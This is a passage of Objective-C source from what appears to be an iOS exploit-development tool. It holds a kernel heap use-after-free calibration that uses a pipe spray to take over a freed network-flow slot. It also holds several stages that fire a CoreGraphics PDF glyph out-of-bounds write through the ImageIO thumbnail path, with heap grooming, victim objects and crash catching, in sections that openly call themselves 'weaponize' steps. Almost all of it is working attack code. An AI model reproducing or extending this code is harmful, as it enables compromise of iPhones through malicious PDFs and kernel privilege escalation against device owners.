    scopeNote(r, [NSString stringWithFormat:@"  client uuid %02x%02x%02x%02x", cuuid[0], cuuid[1], cuuid[2], cuuid[3]]);

    // ---- 1. add flow + find it in heap by uuid ----
    uint8_t fuuid[16] = {0};
    if (kpncAddFlow(fd, cuuid, fuuid) != 0) {
        scopeNote(r, @"  add_flow FAIL");
        close(fd);
        return r;
    }
    scopeNote(r, @"  flow added — scanning heap for uuid... (read-only)");

    // Use the same scan as R5e: walk 0x21 pages for the 16-byte uuid.
    uint64_t pB = kconstant(physBase), pS = kconstant(physSize);
    uint64_t tableSlot = ksymbol(libsptm_frame_table);
    uint64_t tableVA = 0, raw = 0;
    if (tableSlot && scopeGatedRead(tableSlot, &raw, 8, "frame_table", r)) tableVA = kp_untag_ptr(raw);
    if (!tableVA && tableSlot) tableVA = tableSlot;

    uint64_t flowVA = 0;
    if (tableVA && pB && pS) {
        uint32_t totalPages = (uint32_t)(pS >> 14);
        uint8_t fch[0x1000];
        for (uint32_t base2 = 0; base2 < totalPages && !flowVA; base2 += 256) {
            uint32_t n = totalPages - base2;
            if (n > 256) n = 256;
            // read FTE chunk
            for (uint32_t j = 0; j < n && !flowVA; j++) {
                uint64_t fteVA = tableVA + (uint64_t)(base2 + j) * 16;
                uint8_t e[16];
                if (!scopeGatedRead(fteVA, e, 16, "fte", r)) continue;
                if (e[2] != 0x21) continue;
                uint64_t pa = pB + ((uint64_t)(base2 + j) << 14);
                uint64_t pva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
                if (!pva) continue;
                for (int seg = 0; seg < 4 && !flowVA; seg++) {
                    if (!scopeGatedRead(pva + (uint64_t)seg * 0x1000, fch, 0x1000, "pg", r)) continue;
                    for (int q = 0; q <= 0x1000 - 16; q += 8) {
                        if (memcmp(fch + q, fuuid, 16) == 0) {
                            flowVA = pva + (uint64_t)seg * 0x1000 + (uint64_t)q;
                            break;
                        }
                    }
                }
            }
        }
    }
    scopeNote(r, [NSString stringWithFormat:@"  flow VA = 0x%016llx", (unsigned long long)flowVA]);
    if (!flowVA) {
        scopeNote(r, @"  flow not found in heap scan — abort calib.");
        kpncRemoveFlow(fd, fuuid);
        close(fd);
        return r;
    }

    // ---- 2. snapshot BEFORE remove ----
    uint8_t before[KPNC_BUF_SZ];
    memset(before, 0, sizeof(before));
    if (scopeGatedRead(flowVA, before, sizeof(before), "flow before", r)) {
        scopeNote(r, [NSString stringWithFormat:@"  snapshot BEFORE remove: first qword = 0x%016llx",
                      (unsigned long long)*(uint64_t *)before]);
    }

    // ---- 3. remove flow, snapshot AFTER remove (pre-spray) ----
    kpncRemoveFlow(fd, fuuid);
    uint8_t afterRm[KPNC_BUF_SZ];
    memset(afterRm, 0, sizeof(afterRm));
    if (scopeGatedRead(flowVA, afterRm, sizeof(afterRm), "flow after-remove", r)) {
        scopeNote(r, [NSString stringWithFormat:@"  snapshot AFTER remove: first qword = 0x%016llx",
                      (unsigned long long)*(uint64_t *)afterRm]);
        int diff = 0;
        for (int i = 0; i < KPNC_BUF_SZ; i++) if (before[i] != afterRm[i]) diff++;
        scopeNote(r, [NSString stringWithFormat:@"  bytes changed by remove: %d / %d", diff, KPNC_BUF_SZ]);
    }

    // ---- 4. pipe spray of a marker pattern, snapshot AFTER spray ----
    int pfd[2] = {-1, -1};
    if (pipe(pfd) == 0) {
        uint8_t mark[0x800];
        memset(mark, 0xAB, sizeof(mark));
        // write several chunks to fill the pipe buffer (size class ~0x1000)
        for (int i = 0; i < 8; i++) {
            ssize_t w = write(pfd[1], mark, sizeof(mark));
            (void)w;
        }
        uint8_t afterSp[KPNC_BUF_SZ];
        memset(afterSp, 0, sizeof(afterSp));
        if (scopeGatedRead(flowVA, afterSp, sizeof(afterSp), "flow after-spray", r)) {
            scopeNote(r, [NSString stringWithFormat:@"  snapshot AFTER spray: first qword = 0x%016llx",
                          (unsigned long long)*(uint64_t *)afterSp]);
            int hits = 0;
            for (int i = 0; i < KPNC_BUF_SZ; i++) if (afterSp[i] == 0xAB) hits++;
            scopeNote(r, [NSString stringWithFormat:@"  0xAB marker bytes: %d / %d  → %@",
                          hits, KPNC_BUF_SZ,
                          hits > 64 ? @"SPRAY HIT — slot is ours" : @"spray MISS — wrong size class or not freed"]);
            if (hits > 64) {
                scopeNote(r, @"  >> we control the slot. Next: find result-ptr offset.");
            }
        }
        close(pfd[0]);
        close(pfd[1]);
    }

    // ---- 5. pointer survey of the flow (pre-remove copy) ----
    [r appendString:@"\n--- flow pointer survey (from BEFORE snapshot) ---\n"];
    for (int o = 0; o < KPNC_BUF_SZ; o += 8) {
        uint64_t v = 0;
        memcpy(&v, before + o, 8);
        uint64_t u = kp_untag_ptr(v);
        if ((u & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
            scopeNote(r, [NSString stringWithFormat:@"  flow+0x%03x → 0x%016llx", o, (unsigned long long)u]);
        }
    }

    close(fd);
    scopeNote(r, @"  calib done (no kernel writes except pipe spray into user pipe).");
    return r;
}


// ---------------------------------------------------------------------------
// R5h: Glyph Grift empirical test (CVE-2026-86950 class).
// Renders the Calif trigger PDF through ImageIO thumbnail — the same path
// as WhatsApp/iMessage. If CoreGraphics on this iOS still has the aa_*
// sat/trunc mismatch, the process panics. The panic IS the confirmation.
// If we return, the bug is absent (or compiled away).
// ---------------------------------------------------------------------------

+ (NSString *)glyphGriftProbeReport {
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n=== R5i: Glyph Grift variant sweep (one per run, NO KRW needed) ===\n"];

    // Disk-backed cursor — survives app crash (each variant kills the process).
    NSString *idxPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-r5h-idx.txt"];
    int gGlyphIdx = 0;
    {
        NSString *s = [NSString stringWithContentsOfFile:idxPath encoding:NSUTF8StringEncoding error:nil];
        gGlyphIdx = s.intValue;
        if (gGlyphIdx < 0) gGlyphIdx = 0;
    }
    // Extended set: g1-g8 (legacy) + W-variants (weaponize plan §3).
    // Cursor index 0-7 = g1-g8 unchanged; 8-13 = W-set (incl. past-slack + stack).
    const char *names[14] = {
        "g1", "g2", "g3", "g4", "g5", "g6", "g7", "g8",
        "w1a", "w1a_neg", "w4b", "w1b", "w1c", "w3a"
    };
    const char *desc[14] = {
        "tx32000 dx31 n9  STACK 992   (known crash, alloca)",
        "tx32000 dx32 n9  HEAP  1024  (threshold)",
        "tx32000 dx33 n9  HEAP  1056  (THE original crash)",
        "tx32000 dx34 n9  HEAP  1088",
        "tx32000 dx36 n9  HEAP  1152",
        "tx32000 dx40 n9  HEAP  1280",
        "tx32000 dx33 n10 HEAP  2111  (double dev_x)",
        "tx32000 dx33 n8  STACK 528   (half dev_x)",
        "W1a     tx32842 dx32 n9  HEAP 4156 off+4156 (slack!)",
        "W1a_neg tx32842 dx32 n9  HEAP 4156 sign-flip",
        "W4b     tx16454 dx32 n10 HEAP 8252 off+8316 (slack!)",
        "W1b     tx32858 dx32 n9  HEAP 4156 off~5180 PAST good_size",
        "W1c     tx32874 dx32 n9  HEAP 4156 off~6204 well past",
        "W3a     tx32840 dx31 n9  STACK 4028 just past alloca",
    };
    int idx = gGlyphIdx % 14;
    {
        NSString *next = [NSString stringWithFormat:@"%d", gGlyphIdx + 1];
        [next writeToFile:idxPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }

    scopeNote(r, [NSString stringWithFormat:@"  VARIANT [%d] %s : %s", idx, names[idx], desc[idx]]);
    scopeNote(r, @"  !!! если паника — panic log + эта строка = какой вариант сработал !!!");
    // Flush before the render so the log survives a crash.
    [[KPLog shared] append:[NSString stringWithFormat:@"[R5i] rendering variant %s (%s)\n", names[idx], desc[idx]]];
    NSString *logPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-r5h-glyphgrift.txt"];
    NSString *line = [NSString stringWithFormat:@"VARIANT %d %s %s\n", idx, names[idx], desc[idx]];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:logPath];
    if (!fh) { [line writeToFile:logPath atomically:NO encoding:NSUTF8StringEncoding error:nil]; }
    else { [fh seekToEndOfFile]; [fh writeData:[line dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; }

    NSString *name = [NSString stringWithFormat:@"%s", names[idx]];
    NSString *path = [[NSBundle mainBundle] pathForResource:name ofType:@"pdf"];
    if (!path) {
        scopeNote(r, [NSString stringWithFormat:@"  %@.pdf not in bundle — skip", name]);
        return r;
    }
    scopeNote(r, [NSString stringWithFormat:@"  file: %@", path]);

    NSURL *url = [NSURL fileURLWithPath:path];
    CGImageSourceRef src = CGImageSourceCreateWithURL((__bridge CFURLRef)url, NULL);
    if (!src) {
        scopeNote(r, @"  CGImageSourceCreateWithURL failed");
        return r;
    }
    scopeNote(r, @"  source created — rendering thumbnail (this is the danger zone)…");

    int sz = 256;
    CFNumberRef szRef = CFNumberCreate(NULL, kCFNumberIntType, &sz);
    const void *keys[] = { kCGImageSourceCreateThumbnailFromImageAlways,
                           kCGImageSourceThumbnailMaxPixelSize };
    const void *vals[] = { kCFBooleanTrue, szRef };
    CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 2,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

    CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
    {
        NSString *res = [NSString stringWithFormat:@"SURVIVED %d %s\n", idx, desc[idx]];
        NSFileHandle *fh2 = [NSFileHandle fileHandleForWritingAtPath:logPath];
        if (fh2) { [fh2 seekToEndOfFile]; [fh2 writeData:[res dataUsingEncoding:NSUTF8StringEncoding]]; [fh2 closeFile]; }
    }
    scopeNote(r, [NSString stringWithFormat:@"  SURVIVED variant %d (%s). img=%p",
                  idx, desc[idx], (void *)img]);
    if (img) CGImageRelease(img);
    CFRelease(opts);
    CFRelease(szRef);
    CFRelease(src);

    [r appendString:@"\n--- verdict ---\n"];
    scopeNote(r, @"  No panic → этот вариант не сработал. Запусти ещё раз для следующего.");
    scopeNote(r, @"  Паника → смотри kexproof-r5h-glyphgrift.txt: какая VARIANT шла последней.");
    return r;
}


// ---------------------------------------------------------------------------
// R5j: Glyph + heap spray. One shot per boot (spray is userland malloc;
// the glyph render itself is ImageIO). Matching size-class spray with holes,
// render, then scan for corruption. The corruption IS the write.
//
// W-variant spray (weaponize plan §4):
//   w1a/w1a_neg : 4156 B  (DX=32 n=9  coverage alloc)
//   w4b         : 8252 B  (DX=32 n=10 coverage alloc)
//   g1-g8       : 0x1000  (legacy class, kept for cursor compatibility)
// Layout: allocate 4096, free every other → 2048 live + 2048 holes.
// Scan live buffers for byte != 0x41; report index, offset, old→new.
// ---------------------------------------------------------------------------

// Variant spray size class (bytes). 0x1000 = legacy.
static size_t kpGlyphSpraySize(const char *vname) {
    if (!vname) return 0x1000;
    if (!strcmp(vname, "w1a") || !strcmp(vname, "w1a_neg") ||
        !strcmp(vname, "w1b") || !strcmp(vname, "w1c")) return 4156;
    if (!strcmp(vname, "w4b")) return 8252;
    if (!strcmp(vname, "w3a")) return 4028;
    return 0x1000;
}

+ (NSString *)glyphSprayReportVariant:(NSString *)forceName {
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n=== R5j: Glyph + heap spray (one shot per boot) ===\n"];

    // ---- 1. pick variant (disk cursor, or forced name) ----
    NSString *idxPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-r5h-idx.txt"];
    const char *names[14] = {
        "g1","g2","g3","g4","g5","g6","g7","g8",
        "w1a","w1a_neg","w4b","w1b","w1c","w3a"
    };
    const char *desc[14] = {
        "tx32000 dx31 n9  STACK 992",
        "tx32000 dx32 n9  HEAP  1024",
        "tx32000 dx33 n9  HEAP  1056",
        "tx32000 dx34 n9  HEAP  1088",
        "tx32000 dx36 n9  HEAP  1152",
        "tx32000 dx40 n9  HEAP  1280",
        "tx32000 dx33 n10 HEAP  2111",
        "tx32000 dx33 n8  STACK 528",
        "W1a     tx32842 dx32 n9  YS1 HEAP 4156 off+4156 (slack!)",
        "W1a_neg tx32842 dx32 n9  YS1 HEAP 4156 sign-flip",
        "W4b     tx16454 dx32 n10 YS1 HEAP 8252 off+8316 (slack!)",
        "W1b     tx32858 dx32 n9  YS1 HEAP 4156 off~5180 PAST good_size",
        "W1c     tx32874 dx32 n9  YS1 HEAP 4156 off~6204 well past",
        "W3a     tx32840 dx31 n9  YS1 STACK 4028 just past alloca",
    };
    int idx = 0;
    if (forceName.length) {
        for (int i = 0; i < 14; i++) {
            if ([forceName isEqualToString:@(names[i])]) { idx = i; break; }
        }
    } else {
        NSString *s = [NSString stringWithContentsOfFile:idxPath encoding:NSUTF8StringEncoding error:nil];
        idx = s.intValue % 14; if (idx < 0) idx = 0;
        [[NSString stringWithFormat:@"%d", s.intValue + 1] writeToFile:idxPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
    const char *vname = names[idx];
    size_t spraySz = kpGlyphSpraySize(vname);
    scopeNote(r, [NSString stringWithFormat:@"  VARIANT %d (%s) : %s", idx, vname, desc[idx]]);
    scopeNote(r, [NSString stringWithFormat:@"  spray size class = %zu bytes", spraySz]);

    NSString *logPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-r5h-glyphgrift.txt"];
    NSString *line = [NSString stringWithFormat:@"SPRAY+GLYPH VARIANT %d %s spray=%zu\n", idx, vname, spraySz];
    { NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:logPath];
      if (fh) { [fh seekToEndOfFile]; [fh writeData:[line dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; }
      else { [line writeToFile:logPath atomically:NO encoding:NSUTF8StringEncoding error:nil]; } }

    // ---- 2. spray user heap: matching size class, 2048 live + 2048 holes ----
    // Calibration spray (NOT pipe buffers — those are kernel objects).
    // Allocate 4096, free every other → interleaved holes for the coverage alloc.
    enum { NBUFS = 4096 };
    void **bufs = calloc(NBUFS, sizeof(void *));
    if (!bufs) { scopeNote(r, @"calloc fail"); return r; }
    int got = 0, live = 0, holes = 0;
    for (int i = 0; i < NBUFS; i++) {
        void *b = malloc(spraySz);
        if (!b) break;
        memset(b, 0x41, spraySz);
        // index tag at END of buffer — NOT at +8 (that pollutes the scan)
        *(uint64_t *)((uint8_t *)b + spraySz - 8) = (uint64_t)i;
        bufs[i] = b;
        got++;
    }
    // free odd indices → holes; even indices stay live for scanning
    for (int i = 1; i < got; i += 2) {
        free(bufs[i]);
        bufs[i] = NULL;
        holes++;
    }
    live = got - holes;
    size_t goodSz = malloc_good_size(spraySz);
    scopeNote(r, [NSString stringWithFormat:
                  @"  sprayed %d buffers x %zu bytes (0x41) = %.1f MB  [live=%d holes=%d]",
                  got, spraySz, got * (double)spraySz / 1048576.0, live, holes]);
    scopeNote(r, [NSString stringWithFormat:@"  [WSZ] %zu -> malloc_good_size %zu", spraySz, goodSz]);

    // ---- 3. render glyph (may panic) ----
    NSString *name = [NSString stringWithFormat:@"%s", vname];
    NSString *path = [[NSBundle mainBundle] pathForResource:name ofType:@"pdf"];
    if (!path) { scopeNote(r, [NSString stringWithFormat:@"  %@.pdf not in bundle — skip", name]); goto cleanup; }
    {
        NSURL *url = [NSURL fileURLWithPath:path];
        CGImageSourceRef src = CGImageSourceCreateWithURL((__bridge CFURLRef)url, NULL);
        if (src) {
            int sz = 256;
            CFNumberRef szRef = CFNumberCreate(NULL, kCFNumberIntType, &sz);
            const void *keys[] = { kCGImageSourceCreateThumbnailFromImageAlways,
                                   kCGImageSourceThumbnailMaxPixelSize };
            const void *vals[] = { kCFBooleanTrue, szRef };
            CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 2,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            scopeNote(r, @"  rendering glyph with spray live…");
            CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
            scopeNote(r, [NSString stringWithFormat:@"  SURVIVED. img=%p", (void *)img]);
            if (img) CGImageRelease(img);
            CFRelease(opts); CFRelease(szRef); CFRelease(src);
        }
    }

    // ---- 4. scan live sprayed buffers for byte != 0x41 (skip trailing index tag) ----
    [r appendString:@"\n--- spray scan ---\n"];
    int hits = 0;
    int sprayHit = 0;
    long hitOffset = -1;
    int hitDelta = 0;
    size_t scanLen = (spraySz > 8) ? spraySz - 8 : spraySz;  // exclude trailing index
    for (int i = 0; i < got; i += 2) {   // even = live
        uint8_t *b = bufs[i];
        if (!b) continue;
        // find first differing byte (skip trailer)
        size_t first = (size_t)-1;
        int diffCount = 0;
        for (size_t o = 0; o < scanLen; o++) {
            if (b[o] != 0x41) {
                if (first == (size_t)-1) first = o;
                diffCount++;
            }
        }
        if (first == (size_t)-1) continue;
        hits++;
        sprayHit = 1;
        if (hitOffset < 0) hitOffset = (long)first;
        // old→new at first differing byte; also read as u16 for delta
        uint8_t oldB = 0x41, newB = b[first];
        uint16_t oldU = 0x4141, newU = 0;
        memcpy(&newU, b + (first & ~(size_t)1), 2);
        hitDelta = (int)newU - (int)oldU;
        // span = run of consecutive corrupted bytes from first (within scanLen)
        size_t span = 0;
        for (size_t o = first; o < scanLen && b[o] != 0x41; o++) span++;
        scopeNote(r, [NSString stringWithFormat:
            @"  HIT buffer %d first_off=%zu bytes_dirty=%d span=%zu old=0x%02x new=0x%02x u16_delta=%d",
            i, first, diffCount, span, oldB, newB, hitDelta]);
        scopeNote(r, [NSString stringWithFormat:
            @"    qwords: %016llx %016llx %016llx",
            (unsigned long long)*(uint64_t *)b,
            (unsigned long long)*(uint64_t *)(b + 8),
            (unsigned long long)*(uint64_t *)(b + 16)]);
    }
    // VERIFY line — machine-parseable (plan §8)
    scopeNote(r, [NSString stringWithFormat:
        @"  VERIFY SPRAY_HIT=%d HIT_OFFSET=%ld HIT_DELTA=%d BUFSZ=%zu LIVE=%d HOLES=%d VARIANT=%s",
        sprayHit, hitOffset, hitDelta, spraySz, live, holes, vname]);
    if (hits == 0) {
        scopeNote(r, @"  no corruption in sprayed buffers — OOB не попал в спрей.");
        scopeNote(r, @"  (возможно, вариант не того режима, или offset мимо)");
    } else {
        scopeNote(r, [NSString stringWithFormat:@"  >>> %d buffer(s) CORRUPTED — write landed in our spray!", hits]);
        if (hits == 1) {
            scopeNote(r, @"  single-buffer hit → check span above: 1-2 bytes = single-pixel, run = span-fill");
        }
    }

cleanup:
    for (int i = 0; i < got; i += 2) if (bufs[i]) free(bufs[i]);
    free(bufs);
    return r;
}

// Legacy entry point — cursor-driven variant selection.
+ (NSString *)glyphSprayReport {
    return [self glyphSprayReportVariant:nil];
}

// ---------------------------------------------------------------------------
// Typed spray — size field at +8, weaponization probe
//
// Layout per buffer (spraySz bytes):
//   +0x00: u64 magic   = 0x4141414141414141  (stays intact)
//   +0x08: u32 size    = 0x00000100           (TARGET — glyph may overwrite)
//   +0x0C: u32 capacity= 0x00002000
//   +0x10: u8  data…   = 0x42
//   +spraySz-8: u64 index tag (trailer, excluded from scan)
// ---------------------------------------------------------------------------
// u16 ±1 typed spray — Glyph Grift is a ±1 u16 INCREMENT on two adjacent u16s.
// Fill with 0x42 → every u16 = 0x4242. After glyph, scan for u16 != 0x4242.
// ±1 signature: 0x4243 (+1) or 0x4241 (-1). Report offset/old/new/delta.
// ---------------------------------------------------------------------------
// --- crash-catching handler for Glyph PoC (Calif trigger crashes by design) ---
static sigjmp_buf kpGlyphJmp;
static volatile sig_atomic_t kpGlyphCrashed;
static void kpGlyphSegv(int sig) {
    (void)sig;
    kpGlyphCrashed = 1;
    siglongjmp(kpGlyphJmp, 1);
}

+ (NSString *)glyphTypedSprayReport:(NSString *)forceName {
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n=== R5k: Glyph u16 ±1 typed spray ===\n"];

    NSString *vname = forceName.length ? forceName : @"calif";
    // calif = official PoC (tx=32000 DX=33 N=9, no stepping stone)
    size_t spraySz = 4288;  // calif coverage alloc ≈ 4*(1056+16)
    if ([vname isEqualToString:@"w1a"] || [vname isEqualToString:@"w1b"] || [vname isEqualToString:@"w1c"]) spraySz = 4156;
    else if ([vname isEqualToString:@"w4b"]) spraySz = 8252;
    else if ([vname isEqualToString:@"w3a"]) spraySz = 4028;
    scopeNote(r, [NSString stringWithFormat:@"  VARIANT %s spray=%zu", vname.UTF8String, spraySz]);

    NSString *logPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-r5k-u16.txt"];
    NSString *line = [NSString stringWithFormat:@"U16 SPRAY %s spray=%zu\n", vname.UTF8String, spraySz];
    { NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:logPath];
      if (fh) { [fh seekToEndOfFile]; [fh writeData:[line dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile]; }
      else { [line writeToFile:logPath atomically:NO encoding:NSUTF8StringEncoding error:nil]; } }

    enum { NBUFS = 4096 };
    void **bufs = calloc(NBUFS, sizeof(void *));
    if (!bufs) { scopeNote(r, @"calloc fail"); return r; }
    int got = 0, holes = 0;

    // Fill every byte with 0x42 → u16 pattern 0x4242 everywhere.
    // Trailer (last 8 bytes) = index, excluded from scan.
    for (int i = 0; i < NBUFS; i++) {
        void *b = malloc(spraySz);
        if (!b) break;
        memset(b, 0x42, spraySz);
        *(uint64_t *)((uint8_t *)b + spraySz - 8) = (uint64_t)i;
        bufs[i] = b;
        got++;
    }
    for (int i = 1; i < got; i += 2) { free(bufs[i]); bufs[i] = NULL; holes++; }
    int live = got - holes;
    size_t goodSz = malloc_good_size(spraySz);
    scopeNote(r, [NSString stringWithFormat:
                  @"  sprayed %d bufs x %zu (u16=0x4242)  [live=%d holes=%d]  good_size=%zu",
                  got, spraySz, live, holes, goodSz]);

    // ---- render glyph (catch crash — Calif PoC crashes by design) ----
    NSString *path = [[NSBundle mainBundle] pathForResource:vname ofType:@"pdf"];
    if (!path) { scopeNote(r, @"  pdf not in bundle — skip"); goto cleanup; }
    {
        kpGlyphCrashed = 0;
        void (*oldsegv)(int) = signal(SIGSEGV, kpGlyphSegv);
        if (sigsetjmp(kpGlyphJmp, 1) != 0) {
            scopeNote(r, @"  *** CAUGHT SIGSEGV during render (expected for Calif PoC) ***");
        } else {
            NSURL *url = [NSURL fileURLWithPath:path];
            CGImageSourceRef src = CGImageSourceCreateWithURL((__bridge CFURLRef)url, NULL);
            if (src) {
                int sz = 256;
                CFNumberRef szRef = CFNumberCreate(NULL, kCFNumberIntType, &sz);
                const void *keys[] = { kCGImageSourceCreateThumbnailFromImageAlways,
                                       kCGImageSourceThumbnailMaxPixelSize };
                const void *vals[] = { kCFBooleanTrue, szRef };
                CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 2,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                scopeNote(r, @"  rendering glyph…");
                CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
                scopeNote(r, [NSString stringWithFormat:@"  SURVIVED. img=%p", (void *)img]);
                if (img) CGImageRelease(img);
                CFRelease(opts); CFRelease(szRef); CFRelease(src);
            }
        }
        signal(SIGSEGV, oldsegv ? oldsegv : SIG_DFL);
        if (kpGlyphCrashed) scopeNote(r, @"  render crashed — scanning spray anyway");
    }

    // ---- scan for u16 != 0x4242 (±1 signature = Glyph Grift) ----
    [r appendString:@"\n--- u16 ±1 scan ---\n"];
    int hits = 0, hitsPlus = 0, hitsMinus = 0, hitsOther = 0;
    int firstIdx = -1;
    size_t firstOff = 0;
    uint16_t firstOld = 0x4242, firstNew = 0;
    size_t scanLen = (spraySz > 8) ? spraySz - 8 : spraySz;

    for (int i = 0; i < got; i += 2) {
        uint8_t *b = bufs[i];
        if (!b) continue;
        for (size_t o = 0; o + 1 < scanLen; o += 2) {
            uint16_t val = *(uint16_t *)(b + o);
            if (val == 0x4242) continue;
            hits++;
            int delta = (int)val - (int)0x4242;
            if (delta == 1) hitsPlus++;
            else if (delta == -1) hitsMinus++;
            else hitsOther++;
            if (firstIdx < 0) {
                firstIdx = i; firstOff = o; firstOld = 0x4242; firstNew = val;
            }
            if (hits <= 12) {
                scopeNote(r, [NSString stringWithFormat:
                    @"  HIT buf %d off=%zu  u16: 0x4242->0x%04x  delta=%+d%s",
                    i, o, val, delta,
                    (delta == 1 || delta == -1) ? "  [±1 GLYPH!]" : ""]);
            }
        }
    }
    scopeNote(r, [NSString stringWithFormat:
        @"  VERIFY U16_HIT=%d TOTAL=%d PLUS1=%d MINUS1=%d OTHER=%d FIRST=(buf %d off %zu) 0x%04x->0x%04x VARIANT=%s",
        hits > 0, hits, hitsPlus, hitsMinus, hitsOther,
        firstIdx, firstOff, firstOld, firstNew, vname.UTF8String]);

    if (hits == 0) {
        scopeNote(r, @"  no u16 changed — OOB did not reach our spray this run.");
        scopeNote(r, @"  (slack theory: off < good_size → write lands inside coverage chunk)");
    } else {
        scopeNote(r, [NSString stringWithFormat:@"  >>> %d u16 hit(s): +%d / -%d / other %d",
                      hits, hitsPlus, hitsMinus, hitsOther]);
        if (hitsPlus + hitsMinus > 0) {
            scopeNote(r, @"  >>> GLYPH GRIFT SIGNATURE CONFIRMED — ±1 u16 increment in spray!");
        }
    }

cleanup:
    for (int i = 0; i < got; i += 2) if (bufs[i]) free(bufs[i]);
    free(bufs);
    return r;
}

// ---------------------------------------------------------------------------
// Weaponize: typed u32 length fields + safe OOB report
// ---------------------------------------------------------------------------
// Typed object: u32 length fields + OOB report via Glyph ±1 pair
// PREREQUISITE: KRW must be active (pe_v1 first) — walk goes through spray.
// Fill: repeating 32-byte objects {u32 len=0x20; u32 size=0x100; u8 data[24]}
// Glyph ±1 pair corrupts a u32 length → ±65535 delta → OOB.
// ---------------------------------------------------------------------------
+ (NSString *)glyphWeaponizeReport:(NSString *)forceName {
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n=== R5m: Typed object — u32 length + Glyph OOB ===\n"];
    [r appendString:@"  PREREQUISITE: KRW active (run pe_v1 first)\n"];

    NSString *vname = forceName.length ? forceName : @"calif";
    size_t spraySz = 4288;
    scopeNote(r, [NSString stringWithFormat:@"  VARIANT %s spray=%zu", vname.UTF8String, spraySz]);

    enum { NBUFS = 4096 };
    enum { OBJ_SZ = 32, OBJ_LEN = 0x20 };
    void **bufs = calloc(NBUFS, sizeof(void *));
    if (!bufs) { scopeNote(r, @"calloc fail"); return r; }
    int got = 0, holes = 0;

    // Fill with typed 32-byte objects: u32 len=0x20, u32 size=0x100 (TARGET), 24 bytes data
    for (int i = 0; i < NBUFS; i++) {
        void *b = malloc(spraySz);
        if (!b) break;
        uint8_t *p = (uint8_t *)b;
        for (size_t o = 0; o + OBJ_SZ <= spraySz - 8; o += OBJ_SZ) {
            *(uint32_t *)(p + o) = OBJ_LEN;           // length (Glyph corrupts this)
            *(uint32_t *)(p + o + 4) = 0x00000100;    // size TARGET (OOB write hits this)
            memset(p + o + 8, 0x41, OBJ_SZ - 8);      // data fill
        }
        *(uint64_t *)(p + spraySz - 8) = (uint64_t)i;
        bufs[i] = b;
        got++;
    }
    for (int i = 1; i < got; i += 2) { free(bufs[i]); bufs[i] = NULL; holes++; }
    int live = got - holes;
    scopeNote(r, [NSString stringWithFormat:
                  @"  sprayed %d typed objs (len=0x%x tag=CFDA) x %zu  [live=%d holes=%d]",
                  got, OBJ_LEN, spraySz, live, holes]);

    // ---- victim buffers: allocated AFTER spray, same size class ----
    // These are the confused-deputy targets. Fill with distinct magic.
    enum { NVICTIM = 256 };
    void **victims = calloc(NVICTIM, sizeof(void *));
    int nvic = 0;
    for (int i = 0; i < NVICTIM; i++) {
        void *v = malloc(spraySz);
        if (!v) break;
        // Fill with recognizable victim pattern: u32 vtag=0x56435449 'VICT', u32 idx, rest 0xBB
        uint8_t *p = (uint8_t *)v;
        for (size_t o = 0; o + 8 <= spraySz; o += 8) {
            *(uint32_t *)(p + o) = 0x56435449;      // 'VICT'
            *(uint32_t *)(p + o + 4) = (uint32_t)i;  // victim index
        }
        victims[i] = v;
        nvic++;
    }
    scopeNote(r, [NSString stringWithFormat:@"  allocated %d victim bufs (tag=VICT) AFTER spray", nvic]);

    // ---- render (sigsetjmp crash-catch) ----
    NSString *path = [[NSBundle mainBundle] pathForResource:vname ofType:@"pdf"];
    if (!path) { scopeNote(r, @"  pdf not in bundle — skip"); goto cleanup; }
    {
        kpGlyphCrashed = 0;
        void (*oldsegv)(int) = signal(SIGSEGV, kpGlyphSegv);
        if (sigsetjmp(kpGlyphJmp, 1) != 0) {
            scopeNote(r, @"  *** CAUGHT SIGSEGV during render ***");
        } else {
            NSURL *url = [NSURL fileURLWithPath:path];
            CGImageSourceRef src = CGImageSourceCreateWithURL((__bridge CFURLRef)url, NULL);
            if (src) {
                int sz = 256;
                CFNumberRef szRef = CFNumberCreate(NULL, kCFNumberIntType, &sz);
                const void *keys[] = { kCGImageSourceCreateThumbnailFromImageAlways,
                                       kCGImageSourceThumbnailMaxPixelSize };
                const void *vals[] = { kCFBooleanTrue, szRef };
                CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 2,
                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                scopeNote(r, @"  rendering glyph…");
                CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
                scopeNote(r, [NSString stringWithFormat:@"  SURVIVED. img=%p", (void *)img]);
                if (img) CGImageRelease(img);
                CFRelease(opts); CFRelease(szRef); CFRelease(src);
            }
        }
        signal(SIGSEGV, oldsegv ? oldsegv : SIG_DFL);
        if (kpGlyphCrashed) scopeNote(r, @"  render crashed — scanning spray anyway");
    }

    // ---- scan for corrupted u32 length fields ----
